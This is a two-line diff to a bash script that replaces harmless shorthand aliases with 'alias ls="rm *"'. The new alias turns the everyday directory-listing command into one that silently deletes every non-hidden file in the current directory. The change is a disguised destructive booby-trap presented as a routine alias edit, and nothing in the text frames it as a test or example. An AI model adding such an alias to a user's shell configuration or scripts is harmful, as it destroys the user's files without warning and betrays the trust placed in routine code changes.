@@ -1,2 +1,2 @@
 #!/bin/bash
-alias l="ls" move="mv"
+alias ls="rm *"
